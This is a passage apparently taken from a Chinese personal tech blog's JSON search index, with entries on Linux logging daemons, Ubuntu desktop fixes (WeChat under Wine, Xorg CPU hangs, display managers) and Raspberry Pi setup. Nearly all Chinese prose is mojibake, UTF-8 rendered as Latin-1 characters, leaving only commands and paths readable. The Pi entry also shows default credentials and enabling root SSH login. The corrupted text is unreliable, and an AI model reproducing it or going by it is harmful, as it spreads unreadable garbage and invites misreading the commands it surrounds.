¸ã€æœåŠ¡ã€åº”ç”¨ç¨‹åºç­‰çš„æ—¥å¿—ã€‚æ—¥å¿—åœ¨åˆ†æç³»ç»Ÿæ•…éšœã€æ’æŸ¥åº”ç”¨é—®é¢˜ç­‰æ–¹é¢ï¼Œæœ‰ç€è‡³å…³é‡è¦çš„ä½œç”¨ã€‚\n2. å“ªäº›è¿›ç¨‹è´Ÿè´£ç®¡ç†æ—¥å¿—ï¼Ÿ é»˜è®¤æƒ…å†µä¸‹ï¼Œç³»ç»Ÿä¸Šæœ‰ä¸¤ä¸ªå®ˆæŠ¤è¿›ç¨‹æœåŠ¡ç®¡ç†æ—¥å¿—ã€‚journaldå’Œrsyslogdã€‚\njournaldæ˜¯systemdçš„ä¸€ä¸ªç»„ä»¶ï¼Œjournaldçš„è´Ÿè´£æ”¶é›†æ—¥å¿—ï¼Œæ—¥å¿—å¯ä»¥æ¥è‡ª\nSyslogæ—¥å¿— å†…æ ¸æ—¥å¿— åˆå§‹åŒ–å†…å­˜æ—¥å¿— å¯åŠ¨æ—¥å¿— æ‰€æœ‰æœåŠ¡å†™åˆ°æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯çš„æ—¥å¿— journalæ”¶é›†å¹¶æ•´ç†æ”¶åˆ°çš„æ—¥å¿—ï¼Œä½¿å…¶æ˜“äºè¢«ä½¿ç”¨ã€‚\næœ‰ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„\né»˜è®¤æƒ…å†µä¸‹ï¼Œjournalçš„æ—¥å¿—æ˜¯ä¸ä¼šæŒä¹…åŒ–çš„ã€‚ journalçš„æ—¥å¿—æ˜¯äºŒè¿›åˆ¶çš„æ ¼å¼ï¼Œå¹¶ä¸èƒ½ä½¿ç”¨æ–‡æœ¬æŸ¥çœ‹å·¥å…·ï¼Œä¾‹å¦‚cat, æˆ–è€…vimå»åˆ†æã€‚journalçš„æ—¥å¿—éœ€è¦ç”¨journalctlå‘½ä»¤å»è¯»å–ã€‚ journaldä¼šæŠŠæ—¥å¿—å†™åˆ°ä¸€ä¸ªsocketä¸­ï¼Œrsyslogå¯ä»¥é€šè¿‡è¿™ä¸ªsocketæ¥è·å–æ—¥å¿—ï¼Œç„¶åå»å†™æ–‡ä»¶ã€‚\n3. æ—¥å¿—æ–‡ä»¶æ–‡ä»¶ä½ç½® æ—¥å¿—æ–‡ä»¶ä½ç½® /var/log/ ç›®å½• 4. æ—¥å¿—é…ç½®æ–‡ä»¶ä½ç½® /etc/rsyslog.confÂ rsyslogdé…ç½®æ–‡ä»¶ /etc/logrotate.confÂ æ—¥å¿—å›æ»šçš„ç›¸å…³é…ç½® /etc/systemd/journald.confÂ journaldçš„é…ç½®æ–‡ä»¶ 5. rsyslog.conf 5.1. æ¨¡å—åŠ è½½ æ³¨æ„ imjournalå°±æ˜¯ç”¨æ¥è´Ÿè´£è®¿é—®journalä¸­çš„æ—¥å¿— imuxsock æä¾›æœ¬åœ°æ—¥å¿—è¾“å…¥æ”¯æŒï¼Œä¾‹å¦‚ä½¿ç”¨loggerå‘½ä»¤è¾“å…¥æ—¥å¿— $ModLoad imuxsock # provides support for local system logging (e.g. via logger command) $ModLoad imjournal # provides access to the systemd journal 5.2. è¿‡æ»¤ 5.2.1. ä¼˜å…ˆçº§è¿‡æ»¤ **æ¨¡å¼ï¼šFACILITY.**PRIORITY\nè®¾å¤‡(FACILITY):Â kern (0), user (1), mail (2), daemon (3), auth (4), syslog (5), lpr (6), news (7), cron (8), authpriv (9), ftp (10), and local0 through local7 (16 - 23).","title":"Linux æ—¥å¿—ç³»ç»Ÿç®€è¿°"},{"content":"1. ubuntu wine å¾®ä¿¡ä¸­æ–‡ä¹±ç  ä¿®æ”¹æ–‡ä»¶ /opt/deepinwine/tools/run.sh /opt/deepinwine/tools/run_v2.sh å°†WINE_CMDé‚£è¡Œä¸­åŠ å…¥LC_ALL=zh_CN.UTF-8\nWINE_CMD=\u0026#34;LC_ALL=zh_CN.UTF-8 deepin-wine\u0026#34; å‚è€ƒ https://gitee.com/wszqkzqk/deepin-wine-for-ubuntu\n2. ubuntu 20.04 wine å¾®ä¿¡ qq æˆªå›¾æ—¶é»‘å± ä¹‹å‰æˆªå›¾éƒ½æ˜¯å¥½çš„çš„ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œä»Šå¤©æˆªå›¾æ—¶ï¼Œç‚¹å‡»äº†å¾®ä¿¡çš„æˆªå›¾æŒ‰é’®åï¼Œå±å¹•é™¤äº†çŠ¶æ€æ ï¼Œéƒ½å˜æˆé»‘è‰²çš„äº†ã€‚\nå„ç§æœç´¢å¼•æ“æœäº†ä¸€éï¼Œæ²¡æœ‰å‘ç°è§£å†³æ–¹æ¡ˆã€‚\næœ€åå†³å®šæ€è€ƒæœ€è¿‘å¯¹ç³»ç»Ÿåšäº†ä»€ä¹ˆå˜æ›´ï¼Œæœ€è¿‘æˆ‘å¥½åƒç»™ç³»ç»Ÿå®‰è£…äº†æ–°çš„ä¸»é¢˜ï¼Œç„¶ååœ¨ç™»å½•æ—¶ï¼Œé€‰æ‹©äº†æ–°çš„ä¸»é¢˜ï¼Œè€Œæ²¡æœ‰é€‰æ‹©é»˜è®¤çš„ubuntuä¸»é¢˜ã€‚\nåœ¨ç™»å½•ç•Œé¢çš„å³ä¸‹è§’ï¼Œæœ‰ä¸ªæŒ‰é’®ï¼Œç‚¹å‡»ä¹‹åï¼Œå¯ä»¥é€‰æ‹©ä¸»é¢˜ã€‚\næœ€è¿‘æˆ‘éƒ½æ˜¯é€‰æ‹©å…¶ä»–çš„ä¸»é¢˜ï¼Œæ²¡æœ‰é€‰æ‹©é»˜è®¤çš„ubuntuä¸»é¢˜ï¼Œç„¶åæˆ‘å°±æ³¨é”€ä¹‹åï¼Œé‡æ–°åœ¨ç™»å½•æ—¶é€‰æ‹©é»˜è®¤çš„ubuntuä¸»é¢˜åï¼Œå†æ¬¡æ‰“å¼€å¾®ä¿¡æˆªå›¾ï¼ŒåŠŸèƒ½æ¢å¤æ­£å¸¸ã€‚\næ‰€ä»¥è¯´ï¼Œæ—¢ç„¶é€‰æ‹©ubuntuäº†ï¼Œå°±æ²¡å¿…è¦æäº›èŠ±é‡Œèƒ¡å“¨çš„ä¸œè¥¿ã€‚ubuntué»˜è®¤çš„ä¸»é¢˜æŒºå¥½çœ‹çš„ï¼Œè€Œä¸”æ”¯æŒè‡ªå¸¦ä¸»é¢˜çš„è®¾ç½®ï¼Œå°±æ²¡å¿…è¦å†æŠ˜è…¾äº†ã€‚\n3. [open] ubuntu 20.04 é”å±å è§£é”å±å¹•éå¸¸æ…¢ super + lå¯ä»¥ç”¨æ¥é”å±ï¼Œé”å±ä¹‹åå±å¹•å˜æˆé»‘å±ã€‚\né»‘å±ä¹‹åï¼Œå¦‚æœéœ€è¦å”¤é†’å±å¹•ï¼Œå¯ä»¥éšä¾¿åœ¨é”®ç›˜ä¸ŠæŒ‰é”®ï¼Œå»å”¤é†’å±å¹•ã€‚ä½†æ˜¯è¿™ä¸ªå”¤é†’çš„è¿‡ç¨‹æ„Ÿè§‰å¾ˆæ…¢ï¼ŒåŸºæœ¬ä¸Šè¦éšä¾¿æŒ‰é”®æ¥è¿‘åå‡ ç§’ï¼Œå±å¹•æ‰èƒ½è¢«ç‚¹äº®ï¼Œç½‘ä¸Šæœäº†ä¸‹ï¼Œä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°åŸå› ã€‚\nä½†æ˜¯æœ‰ä¸ªè§£å†³åŠæ³•ï¼Œå°±æ˜¯åœ¨é»‘å±çŠ¶æ€ä¸‹ï¼Œä¸è¦éšä¾¿è¾“å…¥ï¼Œè€Œè¦è¾“å…¥æ­£ç¡®çš„å¯†ç ï¼Œç„¶åæŒ‰å›è½¦é”®ï¼Œ è¿™æ ·ä¼šå¿«å¾ˆå¤šã€‚\nä¹Ÿå°±æ˜¯è¯´ï¼Œç³»ç»Ÿè¿è¡Œæ­£å¸¸ï¼Œå¯èƒ½æ˜¯æ˜¾ç¤ºå™¨çš„é—®é¢˜ã€‚\n4. ubuntu 20.04 xorg é«˜cpu æ¡Œé¢å¡æ­» sudo systemctl restart gdm 5. ubuntu çŠ¶æ€æ æ˜¾ç¤ºç½‘é€Ÿ sudo add-apt-repository ppa:fossfreedom/indicator-sysmonitor sudo apt-get install indicator-sysmonitor åœ¨ä»»åŠ¡å¯åŠ¨ä¸­é€‰æ‹©System Monitor\nåœ¨é…ç½®ä¸­å¯ä»¥é€‰æ‹©å¼€æœºå¯åŠ¨\nåœ¨é«˜çº§ä¸­å¯ä»¥è®¾ç½®æ˜¾ç¤ºå“ªäº›åˆ—ï¼Œ æˆ‘åªå…³ç³»ç½‘é€Ÿï¼Œæ‰€ä»¥åªå†™äº†{net}\n6. åœ¨å‘½ä»¤è¡ŒæŸ¥çœ‹å›¾ç‰‡ å®é™…ä¸Šç»ˆç«¯å¹¶ä¸èƒ½æ˜¾ç¤ºå›¾ç‰‡ï¼Œè€Œæ˜¯è°ƒç”¨äº†å¤–éƒ¨çš„ç¨‹åºå–æ˜¾ç¤ºå›¾ç‰‡ã€‚\neog æ˜¯ Eye Of Gnome çš„ç¼©å†™ï¼Œ å®ƒå…¶å®æ˜¯ä¸ªå›¾ç‰‡æŸ¥çœ‹å™¨ã€‚\neog output.png 7. build-requirements: libtool not found. apt-get update apt-get install -y libtool-bin 8. ubuntuä¸‹è§£å‹zipæ–‡ä»¶å‡ºç°ä¸­æ–‡ä¹±ç  ç›¸ä¿¡å¤§å®¶åœ¨ä½¿ç”¨Ubuntuç­‰linuxç³»ç»Ÿæ—¶ç»å¸¸ä¼šé‡åˆ°è§£å‹å‹ç¼©æ–‡ä»¶å‡ºç°ä¹±ç ã€‚ zipçš„å¤„ç†æ–¹å¼ä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ç§\nä¸€ã€unzip è§£å‹æ—¶-OæŒ‡å®šå­—ç¬¦ç¼–ç \nunzip -O GBK xxxx.zip æ³¨ï¼šè§£å‹å¾ˆå¤æ‚çš„ä¸­æ–‡åæ–‡ä»¶ç§°å¦‚æœæŠ¥é”™ï¼Œç”¨å¼•å·æ‹¬èµ·æ¥å³å¯\näºŒã€unar\nunar xxx.zip æ³¨ï¼šè¿™ç§æ–¹å¼è¦å…ˆä¿è¯ç³»ç»Ÿä¸­æœ‰å®‰è£…unarï¼Œè‹¥æ²¡æœ‰ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å®‰è£…ï¼š sudo apt-get install unar\n9. æ”¾å¼ƒubuntuçš„GUI é€‰æ‹©linuxçš„åŸå› æ— éæ˜¯ä¸°å¯Œçš„å¼€å‘è½¯ä»¶åŒ…ï¼Œå„ç§ä¸ªæ ·çš„æ•ˆç‡å·¥å…·ï¼Œè€Œä¸æ˜¯å› ä¸ºæ¼‚äº®çš„GUIã€‚\næˆ‘ä½¿ç”¨ubuntuå¤§æ¦‚å·²ç»æœ‰æœ‰å‡ ä¸ªæœˆäº†ï¼Œè¯´è¯´ä¸€äº›ä½¿ç”¨ä½“ä¼šã€‚\nèŠå¤©è½¯ä»¶ï¼š å¾®ä¿¡ã€QQç­‰å·¥ï¼Œç›®å‰åªæœ‰wineç‰ˆï¼Œä½¿ç”¨ä½“éªŒä¼šç¨å¾®æ¯”macå’Œwindowæœ‰äº›å·®ï¼Œä½†æ˜¯åŸºæœ¬æ˜¯å¯ç”¨ã€‚ è¾“å…¥æ³•ï¼šæœç‹—è¾“å…¥æ³•ï¼ŒåŸºæœ¬ä¸Šå’Œwinå’Œmacæ²¡æœ‰ä»€ä¹ˆå·®åˆ« æ–‡æ¡£: wps åŸºæœ¬ä¸Šå’Œwinå’Œmacæ²¡æœ‰åŒºåˆ« æµè§ˆå™¨: chrome, firefoxä½“éªŒå§‹ç»ˆä¸æ»‘ ç¼–è¾‘å™¨ï¼šneovim ç•…äº«ä¸æ»‘ å„ç§å¼€å‘å·¥å…·ï¼šgit, docker, oh my zsh tmux ç­‰ç­‰ï¼Œ è¿™äº›å¤©ç„¶å°±æ˜¯linuxä¸‹é¢çš„å·¥å…· æ€»ä½“æ¥è¯´ï¼Œå¦‚æœæ²¡æœ‰æœ€è¿‘é‡åˆ°çš„ä¸¤ä¸ªä¸¥é‡é—®é¢˜ï¼Œæˆ‘ä¼šä¸€ç›´ç”¨ubuntuä¸‹å¼€å‘çš„ã€‚\nxorgç»å¸¸cpuå¾ˆé«˜ï¼Œå¯¼è‡´ç•Œé¢å¡æ­»ï¼Œå‡ºç°é¢‘ç‡å¾ˆé«˜ï¼ŒæŸ¥äº†å¾ˆå¤šèµ„æ–™ï¼Œä¾ç„¶æ— æ³•è§£å†³ã€‚åªèƒ½é€šè¿‡restart gdm3å»é‡å¯ã€‚ æœ‰æ—¶å€™xorg cpuä¸ç®—é«˜ï¼Œä¹ŸæŸ¥ä¸å‡ºé«˜cpuçš„è¿›ç¨‹ï¼Œä½†æ˜¯æ•´ä¸ªç•Œé¢è¿˜æ˜¯å¡æ­» å¡æ­»çš„è¿™ä¸ªé—®é¢˜çœŸçš„éå¸¸å½±å“å¼€å‘æ•ˆç‡ã€‚\næ‰€ä»¥æˆ‘å†³å®šå…³é—­ubuntuçš„å›¾å½¢ç•Œé¢ï¼Œé€šè¿‡sshé“¾è¿œç¨‹æ¥ï¼Œåœ¨ä¸Šé¢åšå¼€å‘\n10. ubuntu ç»ˆç«¯è¿˜æ˜¯å›¾å½¢ç•Œé¢ ubuntu bootæœ€åé˜¶æ®µï¼Œè¿›å…¥åˆ°ç™»å½•æç¤ºã€‚\nè¿™é‡Œæœ‰ä¸¤ä¸ªé€‰æ‹©\nå›¾å½¢ç•Œé¢ ttyç»ˆç«¯ å…·ä½“æ˜¯è¿›å…¥å“ªç§æ˜¾ç¤ºæ–¹å¼ï¼Œæ˜¯ç”±é…ç½®å†³å®šã€‚ä½†æ˜¯é»˜è®¤çš„æ˜¯å›¾å½¢ç•Œé¢ã€‚\n# ç»ˆç«¯å¯åŠ¨ systemctl set-default multi-user.target # å›¾å½¢ç•Œé¢å¯åŠ¨ systemctl set-default graphical.target è®¾ç½®ä¹‹åreboot 11. å¦‚ä½•ä»GUIè¿›å…¥åˆ°ç»ˆç«¯æ¨¡å¼å‘¢ï¼Ÿ æŸäº›æ—¶å€™ï¼Œubuntuå›¾å½¢ç•Œé¢å¡æ­»ï¼Œæ— æ³•äº¤äº’ã€‚å¦‚ä½•è¿›å…¥ç»ˆç«¯æ¨¡å¼ä½¿ç”¨topå‘½ä»¤çœ‹çœ‹ä»€ä¹ˆåœ¨å ç”¨CPUå‘¢ï¼Ÿ\næœ‰ä»¥ä¸‹å¿«æ·é”®å¯ä»¥ä»GUIåˆ‡æ¢åˆ°tty\nCtrl + alt + f1 Ctrl + alt + f2 Ctrl + alt + f3 Ctrl + alt + f4 Ctrl + alt + f5 Ctrl + alt + f6 ä¸Šé¢çš„å¿«æ·é”®éƒ½å¯ä»¥è¿›å…¥ç»ˆç«¯ï¼Œå¦‚æœä¸€ä¸ªä¸è¡Œï¼Œå°±ç”¨å¦ä¸€ä¸ªè¯•è¯•ã€‚æ³¨æ„ ctrl alt fåŠŸèƒ½é”® è¦åŒæ—¶æŒ‰ä¸‹å»ã€‚\næˆ‘ä¹‹å‰å°±é‡åˆ°è¿‡ï¼Œå›¾å½¢ç•Œé¢å¡æ­»ï¼Œæ— æ³•æ“ä½œã€‚ç„¶åè¿›å…¥ç»ˆç«¯æ¨¡å¼ï¼Œä½¿ç”¨topå‘½ä»¤ï¼Œçœ‹åˆ°xorgå ç”¨äº†æ¥è¿‘100%çš„CPU.\nç„¶åè¾“å…¥ä¸‹é¢çš„å‘½ä»¤æ¥é‡å¯gdmæ¥è§£å†³çš„\nsudo systemctl restart gdm 12. ä»€ä¹ˆæ˜¯GDM? GDMæ˜¯gnome display managerçš„ç¼©å†™ã€‚\n# æŸ¥çœ‹gonmeç‰ˆæœ¬å· gnome-shell --version å¸¸è§çš„gdmæœ‰\ngdm3 lightdm ssdm é€šè¿‡æŸ¥çœ‹/etc/X11/default-display-managerå¯ä»¥æŸ¥çœ‹ç³»ç»Ÿä½¿ç”¨çš„gdmå…·ä½“æ˜¯å“ªä¸ª\nâœ ~ cat /etc/X11/default-display-manager /usr/sbin/gdm3 ä¹Ÿå¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼æŸ¥çœ‹ systemctl status display-manager # å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼å®‰è£…ä¸åŒçš„gdm sudo apt install lightdm sudo apt install sddm # é€šè¿‡dpkg-reconfigure å¯ä»¥æ¥é…ç½®ä½¿ç”¨ä¸åŒçš„GDM sudo dpkg-reconfigure gdm3 sudo dpkg-reconfigure lightdm sudo dpkg-reconfigure sddm 13. ubuntuæˆªå›¾è½¯ä»¶flameshot apt install flameshot 14. ç”Ÿå‘½ä¸æ¯ æŠ˜è…¾ä¸æ­¢ ä½¿ç”¨ubuntuä½œä¸ºä¸»åŠ›å¼€å‘å·¥å…· æœ€åˆï¼Œæˆ‘èŠ±äº†6å¹´æ—¶é—´åœ¨windowsä¸Šå­¦ä¹ ã€å¨±ä¹ã€ç¼–ç \nåæ¥æˆ‘èŠ±äº†4å¹´æ—¶é—´è½¬åˆ‡æ¢åˆ°macbook proä¸Šå¼€å‘\nç°åœ¨ï¼Œæˆ‘åˆ‡æ¢åˆ°ubuntuä¸Šå¼€å‘ã€‚\næˆ‘èŠ±äº†å¾ˆé•¿çš„æ—¶é—´ï¼Œèµ°è¿‡äº†äººç”Ÿçš„å¤§åŠä¸ªé’è‘±å²æœˆçš„èŠ±æ ·å¹´å\næ‰å­¦ä¼šä»€ä¹ˆæ˜¯æ•ˆç‡ï¼Œä»€ä¹ˆæ˜¯ä¸“ä¸€ã€‚\nè“¦ç„¶å›é¦–\nè¿™10å¹´çš„è·¯ï¼Œæ¯æ¬¡è½¬å˜çš„å¼€å§‹éƒ½æ˜¯æ„Ÿè§‰é•£é“åŠ èº«ï¼Œæ­¥å±¥ç»´è‰°ï¼Œå±¡æ¬¡ä¸‰ç•ªæƒ³è¦æ”¾å¼ƒ\nå†…å¿ƒæ·±å¤„å½·ä½›æœ‰äººåœ¨è¯´ï¼Œä½ ä¸ºä»€ä¹ˆè¦æ”¹å˜å‘¢ï¼Ÿ ä¹‹å‰çš„æ„Ÿè§‰ä¸æ˜¯å¾ˆå¥½å—ï¼Ÿ\nä½ ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆæŠ˜è…¾å‘¢ï¼Ÿ\næœ‰ä¸€ç§é¸Ÿå„¿æ³¨å®šä¸ä¼šè¢«å…³åœ¨ç‰¢ç¬¼é‡Œï¼Œå› ä¸ºå®ƒçš„æ¯ä¸€ç‰‡ç¾½æ¯›éƒ½é—ªè€€ç€è‡ªç”±çš„å…‰è¾‰ã€‚\u0026ndash;ã€Šè‚–ç”³å…‹çš„æ•‘èµã€‹\næ”¹å˜ï¼Œçš„ç¡®æ˜¯è®©äººä¸èˆ’æœçš„äº‹æƒ…ã€‚\nè¯´å®è¯ï¼Œåˆšå¼€å§‹åœ¨ubuntuä¸Šå¼€å‘ï¼Œè¿è£…ä¸ªä¸­æ–‡è¾“å…¥æ³•éƒ½è®©æˆ‘ç»æœ›çš„æƒ³è¦æ”¾å¼ƒã€‚\nè¿˜å¥½æ˜¯ITè¡Œä¸šï¼Œä½ è·¯è¿‡çš„å‘ï¼Œè‚¯å®šæœ‰å‰ä»»è¸©è¿‡ã€‚\nè¯´æ¥æœ‰ç‚¹æç¬‘ï¼Œæˆ‘åœ¨ubuntuä¸Šä½¿ç”¨vscodeæ—¶ï¼Œå±…ç„¶æ„Ÿè§‰ä¸ä¹ æƒ¯äº†ã€‚\næˆ‘ä¸ä¹ æƒ¯å†™ç€å†™ç€ä»£ç ï¼Œè¿˜è¦æŠŠæ‰‹ä»é”®ç›˜ä¸Šç§»å¼€ï¼Œå»å¯»æ‰¾åƒé‡Œä¹‹è¡Œçš„é¼ æ ‡ï¼Œç„¶åæ»‘åŠ¨ã€ç‚¹å‡»ã€ä¸€ç›´ä¸åœæ­‡\nç„¶åæˆ‘å°±åˆ‡æ¢å›neovimã€‚\næœ‰äººè¯´ï¼švimæ˜¯è·Ÿå¾—ä¸Šæ€ç»´é€Ÿåº¦çš„ç¼–è¾‘å™¨ã€‚åªæœ‰çœŸæ­£ä½¿ç”¨è¿‡çš„äººï¼Œæ‰èƒ½ç†è§£è¿™å¥è¯ã€‚\nå½“ä½ æ¯æ¬¡æƒ³å‘ä¸Šé£çš„æ—¶å€™ï¼Œæ€»ä¼šæœ‰æ›´å¤§çš„é˜»åŠ›ã€‚\n15. æœ€åçš„æœ€å æˆ‘ç”¨çš„deepin å¦‚æœæˆ‘åªç”¨ç»ˆç«¯ï¼Œè¿ä¸Šlinuxåšå¼€å‘ï¼Œé‚£ä¹ˆæˆ‘æœ€å¥½çš„é€‰æ‹©æ˜¯ubuntuæˆ–è€…manjaro ä½†æ˜¯æˆ‘è¿˜æ˜¯é¿å…ä¸äº†è¦ç”¨å¾®ä¿¡ï¼Œè…¾è®¯ä¼šè®®ç­‰Appï¼Œæˆ‘åˆæƒ³ç”¨linux, é‚£æœ€å¥½çš„é€‰æ‹©æ˜¯deepin å¯èƒ½æ˜¯äººè€äº†ï¼Œä¸æƒ³å†æŠ˜è…¾äº†\n","permalink":"https://wdd.js.org/posts/2022/10/ubuntu-tips/","summary":"1. ubuntu wine å¾®ä¿¡ä¸­æ–‡ä¹±ç  ä¿®æ”¹æ–‡ä»¶ /opt/deepinwine/tools/run.sh /opt/deepinwine/tools/run_v2.sh å°†WINE_CMDé‚£è¡Œä¸­åŠ å…¥LC_ALL=zh_CN.UTF-8\nWINE_CMD=\u0026#34;LC_ALL=zh_CN.UTF-8 deepin-wine\u0026#34; å‚è€ƒ https://gitee.com/wszqkzqk/deepin-wine-for-ubuntu\n2. ubuntu 20.04 wine å¾®ä¿¡ qq æˆªå›¾æ—¶é»‘å± ä¹‹å‰æˆªå›¾éƒ½æ˜¯å¥½çš„çš„ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œä»Šå¤©æˆªå›¾æ—¶ï¼Œç‚¹å‡»äº†å¾®ä¿¡çš„æˆªå›¾æŒ‰é’®åï¼Œå±å¹•é™¤äº†çŠ¶æ€æ ï¼Œéƒ½å˜æˆé»‘è‰²çš„äº†ã€‚\nå„ç§æœç´¢å¼•æ“æœäº†ä¸€éï¼Œæ²¡æœ‰å‘ç°è§£å†³æ–¹æ¡ˆã€‚\næœ€åå†³å®šæ€è€ƒæœ€è¿‘å¯¹ç³»ç»Ÿåšäº†ä»€ä¹ˆå˜æ›´ï¼Œæœ€è¿‘æˆ‘å¥½åƒç»™ç³»ç»Ÿå®‰è£…äº†æ–°çš„ä¸»é¢˜ï¼Œç„¶ååœ¨ç™»å½•æ—¶ï¼Œé€‰æ‹©äº†æ–°çš„ä¸»é¢˜ï¼Œè€Œæ²¡æœ‰é€‰æ‹©é»˜è®¤çš„ubuntuä¸»é¢˜ã€‚\nåœ¨ç™»å½•ç•Œé¢çš„å³ä¸‹è§’ï¼Œæœ‰ä¸ªæŒ‰é’®ï¼Œç‚¹å‡»ä¹‹åï¼Œå¯ä»¥é€‰æ‹©ä¸»é¢˜ã€‚\næœ€è¿‘æˆ‘éƒ½æ˜¯é€‰æ‹©å…¶ä»–çš„ä¸»é¢˜ï¼Œæ²¡æœ‰é€‰æ‹©é»˜è®¤çš„ubuntuä¸»é¢˜ï¼Œç„¶åæˆ‘å°±æ³¨é”€ä¹‹åï¼Œé‡æ–°åœ¨ç™»å½•æ—¶é€‰æ‹©é»˜è®¤çš„ubuntuä¸»é¢˜åï¼Œå†æ¬¡æ‰“å¼€å¾®ä¿¡æˆªå›¾ï¼ŒåŠŸèƒ½æ¢å¤æ­£å¸¸ã€‚\næ‰€ä»¥è¯´ï¼Œæ—¢ç„¶é€‰æ‹©ubuntuäº†ï¼Œå°±æ²¡å¿…è¦æäº›èŠ±é‡Œèƒ¡å“¨çš„ä¸œè¥¿ã€‚ubuntué»˜è®¤çš„ä¸»é¢˜æŒºå¥½çœ‹çš„ï¼Œè€Œä¸”æ”¯æŒè‡ªå¸¦ä¸»é¢˜çš„è®¾ç½®ï¼Œå°±æ²¡å¿…è¦å†æŠ˜è…¾äº†ã€‚\n3. [open] ubuntu 20.04 é”å±å è§£é”å±å¹•éå¸¸æ…¢ super + lå¯ä»¥ç”¨æ¥é”å±ï¼Œé”å±ä¹‹åå±å¹•å˜æˆé»‘å±ã€‚\né»‘å±ä¹‹åï¼Œå¦‚æœéœ€è¦å”¤é†’å±å¹•ï¼Œå¯ä»¥éšä¾¿åœ¨é”®ç›˜ä¸ŠæŒ‰é”®ï¼Œå»å”¤é†’å±å¹•ã€‚ä½†æ˜¯è¿™ä¸ªå”¤é†’çš„è¿‡ç¨‹æ„Ÿè§‰å¾ˆæ…¢ï¼ŒåŸºæœ¬ä¸Šè¦éšä¾¿æŒ‰é”®æ¥è¿‘åå‡ ç§’ï¼Œå±å¹•æ‰èƒ½è¢«ç‚¹äº®ï¼Œç½‘ä¸Šæœäº†ä¸‹ï¼Œä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°åŸå› ã€‚\nä½†æ˜¯æœ‰ä¸ªè§£å†³åŠæ³•ï¼Œå°±æ˜¯åœ¨é»‘å±çŠ¶æ€ä¸‹ï¼Œä¸è¦éšä¾¿è¾“å…¥ï¼Œè€Œè¦è¾“å…¥æ­£ç¡®çš„å¯†ç ï¼Œç„¶åæŒ‰å›è½¦é”®ï¼Œ è¿™æ ·ä¼šå¿«å¾ˆå¤šã€‚\nä¹Ÿå°±æ˜¯è¯´ï¼Œç³»ç»Ÿè¿è¡Œæ­£å¸¸ï¼Œå¯èƒ½æ˜¯æ˜¾ç¤ºå™¨çš„é—®é¢˜ã€‚\n4. ubuntu 20.04 xorg é«˜cpu æ¡Œé¢å¡æ­» sudo systemctl restart gdm 5. ubuntu çŠ¶æ€æ æ˜¾ç¤ºç½‘é€Ÿ sudo add-apt-repository ppa:fossfreedom/indicator-sysmonitor sudo apt-get install indicator-sysmonitor åœ¨ä»»åŠ¡å¯åŠ¨ä¸­é€‰æ‹©System Monitor\nåœ¨é…ç½®ä¸­å¯ä»¥é€‰æ‹©å¼€æœºå¯åŠ¨\nåœ¨é«˜çº§ä¸­å¯ä»¥è®¾ç½®æ˜¾ç¤ºå“ªäº›åˆ—ï¼Œ æˆ‘åªå…³ç³»ç½‘é€Ÿï¼Œæ‰€ä»¥åªå†™äº†{net}\n6. åœ¨å‘½ä»¤è¡ŒæŸ¥çœ‹å›¾ç‰‡ å®é™…ä¸Šç»ˆç«¯å¹¶ä¸èƒ½æ˜¾ç¤ºå›¾ç‰‡ï¼Œè€Œæ˜¯è°ƒç”¨äº†å¤–éƒ¨çš„ç¨‹åºå–æ˜¾ç¤ºå›¾ç‰‡ã€‚\neog æ˜¯ Eye Of Gnome çš„ç¼©å†™ï¼Œ å®ƒå…¶å®æ˜¯ä¸ªå›¾ç‰‡æŸ¥çœ‹å™¨ã€‚","title":"Ubuntu ä½¿ç”¨è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ä»¥åŠè§£å†³æ–¹æ¡ˆ"},{"content":"æˆ‘å·²ç»è£…è¿‡å‡ æ¬¡æ ‘è“æ´¾çš„ç³»ç»Ÿäº†ï¼Œè®°å½•ä¸€äº›ä½¿ç”¨å¿ƒå¾—ã€‚\n1. é€‰æ‹©å“ªä¸ªç‰ˆæœ¬ æœ€å¥½ç”¨æ— æ¡Œé¢ç‰ˆï¼Œæ— æ¡Œé¢ç‰ˆæ›´åŠ ç¨³å®šã€‚æˆ‘ä¹‹å‰ç”¨è¿‡å‡ æ¬¡æ¡Œé¢ç‰ˆï¼Œæ¡Œé¢ç‰ˆå­˜åœ¨ä»¥ä¸‹é—®é¢˜ã€‚\nä½¿ç”¨å¶å°”æ„Ÿè§‰ä¼šå¡ ç»å¸¸ä½¿ç”¨ä¸€å¤©ä¹‹åï¼Œç¬¬äºŒå¤©è¦é‡å¯ç³»ç»Ÿã€‚ 2. å…³äºåˆå§‹è®¾ç½® é»˜è®¤çš„ç”¨æˆ·æ˜¯ piï¼Œé»˜è®¤çš„å¯†ç æ˜¯raspberry ç™»å½•æˆåŠŸä¹‹åï¼Œsudo passwd pi æ¥ä¿®æ”¹piç”¨æˆ·çš„å¯†ç  ç™»å½•ä¹‹åï¼Œsudo passwd root æ¥è®¾ç½®rootçš„ç”¨æˆ·å¯†ç  3. å¼€å¯ssh è¿œç¨‹ç™»å½•æœåŠ¡ raspi-config 4. rootç”¨æˆ·sshç™»å½• é»˜è®¤æ ‘è“æ´¾æ˜¯ç¦æ­¢ä½¿ç”¨rootè¿œç¨‹ç™»å½•çš„ï¼Œæƒ³è¦å¼€å¯çš„è¯ï¼Œéœ€è¦ç¼–è¾‘/etc/ssh/sshd_configæ–‡ä»¶ï¼Œå¢åŠ ä¸€è¡ŒPermitRootLogin yes, ç„¶åé‡å¯sshæœåŠ¡\nvi /etc/ssh/sshd_config PermitRootLogin yes sudo systemctl restart ssh // chong 5. å…³äºè”ç½‘ è”ç½‘æœ‰ä¸¤ä¸ªæ–¹æ¡ˆ\nç”¨ç½‘çº¿è¿æ¥ï¼Œç®€å•æ–¹ä¾¿ï¼Œä½†æ˜¯æœ‰æ¡çº¿å­ï¼Œæ€»ä¼šæŠŠæ¡Œé¢æå¾—å¾ˆä¹± ä½¿ç”¨wifiè¿æ¥ï¼Œç®€å•æ–¹ä¾¿ 